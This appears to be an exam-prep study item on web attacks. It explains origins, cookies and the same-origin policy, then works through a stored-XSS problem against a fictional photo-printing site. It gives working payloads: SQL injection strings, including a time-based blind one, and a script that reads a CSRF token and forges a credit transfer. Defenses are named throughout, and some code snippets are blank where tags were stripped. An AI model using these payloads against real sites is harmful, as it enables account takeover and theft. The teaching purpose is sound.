name: Web attack construction: XSS, CSRF, SQLi with origin/cookie reasoning
theory_paragraphs: The web security model rests on the \term{origin}: the triple $(\text{scheme}, \text{domain}, \text{port})$, e.g. $(\text{https}, \text{www.bank.com}, 443)$. The \term{Same-Origin Policy (SOP)} isolates origins for confidentiality and integrity: a page's JavaScript (via the DOM) may read data only from its own origin. Two consequences are \imp{must-remember}:\begin{tightitem}\item A script loaded from another origin (e.g. \texttt{

HTTP is stateless, so sessions are carried by \term{cookies}: server-sent data the browser stores and echoes back on every matching request (\texttt{Set-Cookie} header). Cookie scope uses (scheme, domain, path) -- NOT port -- and three flags gate every attack:\begin{tightitem}\item \term{HttpOnly}: if set, JavaScript CANNOT read the cookie via \texttt{document.cookie}. Cookie theft by injected JS requires \imp{HttpOnly = false}.\item \term{Secure}: cookie is sent only over HTTPS. Irrelevant once all traffic is HTTPS; over plain HTTP a network attacker reads the cookie on the wire regardless of JS.\item \term{SameSite=Strict}: cookie is sent only for same-site requests -- this kills classic CSRF from an attacker's page.\end{tightitem}Know the attacker models: a \term{network attacker} reads/injects on the wire (defeated by HTTPS); a \term{web attacker} only controls a site like \texttt{attacker.com} and content the victim's browser loads.

The three injection attack classes, distinguished by WHERE the injection executes:\begin{tightitem}\item \term{Cross-Site Scripting (XSS)}: attacker JavaScript runs in the VICTIM'S BROWSER with the victim site's origin. \term{Stored XSS}: payload saved server-side (posts, comments) and served to every viewer. \term{Reflected XSS}: payload echoed back from a request parameter (e.g. \texttt{/search?q=X}). \term{DOM-based XSS}: client-side JS insecurely writes attacker data into the page. Consequence: full control as the site's origin -- read \texttt{document.cookie} (if HttpOnly=false), read page content such as embedded CSRF tokens, issue authenticated requests, deface.\item \term{Cross-Site Request Forgery (CSRF)}: an attacker page triggers a state-changing request (e.g. \texttt{} or an auto-submitted form); the browser attaches the victim's cookies and the server cannot tell the request was forged. The attacker \imp{cannot read the response} (SOP) but the side effect happens anyway. No attacker JavaScript in the victim origin is needed -- a \texttt{

The matching defenses, to be named when the question asks how to fix or why an attack fails:\begin{tightitem}\item XSS: proper output encoding/escaping (never send untrusted data to the browser unescaped), framework auto-escaping, and \term{Content Security Policy (CSP)} (e.g. a \texttt{script-src} allowlist that blocks inline scripts). Blacklist filtering of \texttt{<script>} is fragile (many event handlers, encodings).\item CSRF: secret per-session \term{CSRF tokens} embedded in forms (the attacker page cannot know/read them), \texttt{SameSite} cookies, Referer/Origin header validation. Cookie-based authentication alone is \imp{insufficient for state-changing requests}. Note: CSRF tokens do \imp{not} stop XSS, since in-origin script can read the token from the DOM.\item SQLi: \term{parameterized / prepared queries} -- values are sent separately from the command, so user input can never change the query structure.\end{tightitem}
theory_cheatsheet: Origin = (scheme, domain, port); cookie scope = (scheme, domain, path), NO port.
A cross-origin-loaded script runs with the LOADING PAGE's origin -- not the host of the .js file.
SOP blocks reading cross-origin responses, never sending requests; cookies attach automatically $\Rightarrow$ CSRF works.
HttpOnly=false is required to steal a cookie via document.cookie; Secure only forces HTTPS; SameSite=Strict defeats CSRF.
Network attacker + HTTP: read/inject on the wire, cookie flags irrelevant. HTTPS: must attack via web content instead.
XSS classes: stored (in DB, hits all viewers), reflected (echoed request param), DOM-based (client-side sink).
CSRF test: does any attacker JS execute in the victim origin? No JS, just a triggered request $\Rightarrow$ CSRF.
CSRF token stops CSRF (attacker page cannot read it) but not XSS (in-origin script reads it from the DOM).
SQLi payloads: ' OR 1=1 -- (tautology), x' AND cond -- (boolean), AND SLEEP(10)=1 (time-based blind, needs short-circuit assumption).
Defenses: escaping/CSP (XSS), CSRF tokens/SameSite (CSRF), parameterized queries (SQLi), HttpOnly (JS cookie theft), HTTPS (wire sniffing).
identify_givens: A small web application described by its endpoints and behaviors (login POST returning a session-token cookie, a page that stores user posts/comments or reflects a URL parameter, a state-changing GET/POST endpoint like follow, transfer, or resetPassword possibly guarded by a CSRF token, or a server-side SQL query built by string concatenation of a user-controlled variable), plus the attacker model (network attacker, controls attacker.com, or can only submit posts), the transport (HTTP vs HTTPS), and cookie attributes (Secure, HttpOnly, SameSite). Often a fixed menu of events to order into an attack sequence.
identify_target: Produce a concrete attack that achieves a stated goal: a payload plus the ordered sequence of events (post content, victim page load, attacker server response) that steals the session token, runs JavaScript in a given origin, forces an authenticated action (follow, login-as, balance transfer, password reset), or extracts a boolean/value from the database; and justify why it works (origin of executed script, SOP, cookie flags, CSRF token reachability) or which defense blocks it.
strategy_name: Match goal to injection channel, then trace origin and cookie flow

algorithm.detail: Decide what the attacker must achieve:\begin{tightitem}\item Execute JS in the victim site's origin $\Rightarrow$ \term{XSS}.\item Make the victim's browser send an authenticated request (no attacker JS needed) $\Rightarrow$ \term{CSRF}.\item Alter the server-side SQL query's logic $\Rightarrow$ \term{SQLi}.\end{tightitem}\imp{The goal, not the delivery tag, determines the class} -- a \texttt{<script src=...>} that merely triggers a request without loading real JS is CSRF, not XSS. If a cookie flag makes the stated goal impossible (e.g. token theft with HttpOnly=true), re-aim at what remains possible: forcing an action via in-origin script.

Read the givens that gate each attack:\begin{tightitem}\item HTTP + network attacker: read/inject on the wire regardless of cookie flags.\item HTTPS everywhere: wire attacks fail; switch to web-content attacks (XSS/CSRF).\item \texttt{Secure=true}: cookie sent only over HTTPS -- irrelevant under HTTPS, blocks HTTP sending.\item \texttt{HttpOnly=true}: cookie theft via \texttt{document.cookie} is blocked -- pivot to action-forging (the script needs no cookie, the browser attaches it).\item CSRF token on the state-changing endpoint: pure CSRF from the attacker's site fails (token unreadable cross-origin), but XSS can read it from the DOM.\item Stored input field (posts, titles) $\Rightarrow$ stored XSS; reflected URL parameter $\Rightarrow$ reflected XSS; string-concatenated SQL with quote-delimited literals $\Rightarrow$ SQLi.\end{tightitem}

\begin{tightitem}\item \term{XSS exfiltration} (needs HttpOnly=false): \texttt{}.\item \term{XSS action-forging}: read any needed secret from the page, then POST: \texttt{}.\item \term{CSRF}: \texttt{} or a hidden auto-submitting form -- works only if no unpredictable token is required.\item \term{SQLi}: \texttt{' OR 1=1 -- } to dump all rows; \texttt{x' AND customerName='Bob' -- } for boolean inference; append \texttt{AND SLEEP(10)=1} for time-based blind extraction.\end{tightitem}

Sequence the allowed events so prerequisites come first:\begin{tightitem}\item Victim logs in BEFORE the cookie-bearing page load.\item A malicious post/comment/title is stored BEFORE the victim visits the listing.\item For an attacker-origin script: store an \texttt{<iframe src="attacker.com">} first, then have \texttt{attacker.com} serve the \texttt{<script>}.\end{tightitem}Write one event per row with the placeholder value filled in.

State WHY it works:\begin{tightitem}\item A script executes with the origin of the page that loaded it, so a stored payload runs as the victim site's own code: it may read the DOM (including hidden CSRF tokens) and \texttt{document.cookie} if HttpOnly=false.\item SOP blocks reading cross-origin responses but never blocks sending requests, and cookies are attached automatically -- why CSRF works, why exfiltration is observable at attacker.com, and why the attacker's own site cannot learn the victim's CSRF token.\item For SQLi: the concatenated payload becomes part of the query TEXT the server parses, so \texttt{--} neutralizes the trailing quote/logic.\end{tightitem}

Note any extra assumption (e.g. \imp{SLEEP(10) must be short-circuit-evaluated only when the AND's left side is true}) and name the matching defense when asked, including defenses that do NOT help:\begin{tightitem}\item XSS: output encoding/escaping, CSP.\item CSRF: CSRF tokens, SameSite cookies -- but tokens do not stop XSS.\item SQLi: parameterized/prepared queries.\item Cookie theft via JS: HttpOnly -- but HttpOnly does not stop action-forging XSS.\item Wire attacks: HTTPS.\end{tightitem}

variations.name: Attack-class identification with T/F origin statements
variations.detail: Instead of constructing the attack, the exam shows a payload (e.g. \texttt{<script src="https://attacker.com/payload.js"></script>} in a stored post) and asks to judge statements: the script runs with the origin of the LOADING page (e.g. fakebook.com), not the origin hosting the file; SOP does not block fetching the file; cookie-stealing via a stored post is STORED XSS, not DOM-based. Trap: confusing the script's hosting origin with its execution origin, and mislabeling stored vs DOM-based.

variations.name: CSRF disguised as XSS
variations.detail: A payload like \texttt{<script src="https://fakebook.com/resetPassword?password=42"></script>} uses a script tag but loads no real JS -- it only makes the victim's browser issue the authenticated GET with cookies attached. The correct classification is CSRF. The algorithm adapts by checking whether any attacker JavaScript actually executes in the victim origin. Trap: answering \q{XSS} because of the \texttt{<script>} tag.

variations.name: Cookie/transport flag flips
variations.detail: The same session-token-theft goal is re-asked under different flags: HTTP + HttpOnly=true forces a pure network-sniffing answer (read the login response on the wire; JS cannot help); HTTPS + HttpOnly=false forces a reflected/stored XSS with \texttt{document.cookie} exfiltration; HTTPS + HttpOnly=true forces action-forging XSS instead of token theft. Traps: proposing \texttt{document.cookie} when HttpOnly=true, or proposing wire sniffing when traffic is HTTPS and the attacker is only a network attacker.

variations.name: CSRF token reachability reasoning
variations.detail: A state-changing endpoint requires a per-session token embedded as a hidden input. The attacker must reason: pure CSRF fails (SOP blocks the attacker page from reading the token), but a stored/reflected XSS payload reads the token from the DOM and includes it in the forged POST. Trap: claiming the CSRF token blocks all forgery, or claiming the attacker's own site can fetch and parse the victim's page.

variations.name: Blind and time-based SQLi
variations.detail: After the tautology (\texttt{' OR 1=1 -- }) and row-count boolean variants, the output is hidden (\q{Ticket count not available}) and a timing channel is required: \texttt{x' AND customerName='Bob' AND SLEEP(10)=1 -- }, inferring the boolean from response delay. The algorithm adapts by replacing output-observation with timing-observation, and requires explicitly stating the short-circuit assumption that SLEEP runs only when the preceding AND terms are true. Trap: forgetting the assumption or leaving the string literal unterminated.

original_problem: The photo-printing shop \texttt{www.pixprint.com} lets registered users create albums. A user logs in by POSTing username and password to \texttt{/login}; on success the server sets a session-token cookie with \texttt{Secure=true} and \texttt{HttpOnly=true}. Every page served to a logged-in user embeds a per-session token in a hidden form field \texttt{<input type="hidden" name="csrf" value="...">}, and the endpoint \texttt{/transfer} accepts a POST with parameters \texttt{to}, \texttt{amount}, and \texttt{csrf}; if the \texttt{csrf} value matches the session's token, the given amount of store credit is moved from the caller's account to account \texttt{to}. The page \texttt{/albums} lists the titles of the twenty most recent albums; titles are stored on the server and displayed verbatim (no output encoding). Mallory is a registered pixprint user and also controls the web server \texttt{www.darklens.com}; she has no network access to other users' traffic. All pixprint traffic uses HTTPS. The JavaScript helper \texttt{post(url, params)}, which sends an HTTP POST request to \texttt{url} with parameters \texttt{params}, is available on every pixprint page. Goal: move 200 credits from Beatrice's account to Mallory's account. Give the payload, the sequence of events, justify why the attack works, and explain why Mallory cannot achieve the goal with a pure CSRF attack from \texttt{www.darklens.com} instead.

original_steps.work: Classify the goal: Mallory must cause a state change (a credit transfer) in Beatrice's session -- an action-forgery goal, pointing at \term{CSRF} or \term{XSS}. Note immediately what is NOT the goal: stealing the session token. \texttt{HttpOnly=true} makes \texttt{document.cookie} unreadable to any injected JavaScript, but a forged action does not need the cookie value at all -- the browser attaches the cookie automatically to every pixprint request.

Check channel and flags. HTTPS plus no network access rules out wire attacks. The decisive given is the \texttt{csrf} parameter on \texttt{/transfer}: a pure CSRF attack from \texttt{www.darklens.com} (e.g. an auto-submitted form POSTing \texttt{to=mallory, amount=200}) would carry Beatrice's cookie but \imp{lack a valid token}, because SOP prevents Mallory's page from reading pixprint's pages and learning the per-session value. The verbatim-displayed album titles give a \term{stored XSS} channel, and script running in the pixprint origin CAN read the token from the DOM. So the attack class is stored XSS performing action-forgery.

Craft the payload. Mallory creates an album whose title is
\[ \texttt{<script>var t=document.getElementsByName("csrf")[0].value; post("/transfer", "to=mallory,amount=200,csrf="+t)</script>} \]
When executed in Beatrice's browser on \texttt{/albums}, the script reads the hidden token of her session out of the page and POSTs a transfer request that includes it, so the server's token check passes.

Order the events: (1) Mallory, as a registered user, creates the album with the payload title, so it is stored server-side. (2) Beatrice logs in via POST to \texttt{/login}; her browser stores the session cookie and every pixprint page now embeds her per-session csrf token. (Steps 1 and 2 may occur in either order -- both must precede step 3.) (3) Beatrice loads \texttt{/albums}; the server embeds Mallory's stored title verbatim in the page together with Beatrice's hidden token field, and her browser parses and executes the \texttt{<script>}, which issues the transfer POST with cookie and token attached.

Justify with origin and SOP. The script executes with the origin of the page that loaded it, \texttt{www.pixprint.com}, so SOP treats it as pixprint's own code: it may read the DOM, including the hidden \texttt{csrf} input (this same-origin DOM read is exactly what Mallory's own site is denied). SOP never blocks SENDING requests, and the browser attaches Beatrice's cookie automatically, so the POST to \texttt{/transfer} is authenticated and carries a valid token -- the transfer executes. Pure CSRF from \texttt{www.darklens.com} fails because Mallory cannot fill in the \texttt{csrf} parameter: reading it requires a cross-origin read of a pixprint page, which SOP blocks; \imp{a CSRF token defeats CSRF but not in-origin script}.

Assumptions and defenses. Assumption: Beatrice visits \texttt{/albums} while logged in, and the payload album is among the twenty most recent. Defenses: (a) proper output encoding of album titles or a CSP blocking inline scripts removes the XSS; (b) \texttt{HttpOnly=true} is already set and correctly blocks token theft via \texttt{document.cookie}, but this attack shows it is \imp{not a defense against action-forging XSS}; (c) the CSRF token correctly blocks forgery from Mallory's own site but not from injected in-origin script -- only removing the injection fixes that. Final answer: the stored title \texttt{<script>var t=document.getElementsByName("csrf")[0].value; post("/transfer", "to=mallory,amount=200,csrf="+t)</script>}, delivered by store + login + load, moves 200 credits to Mallory.
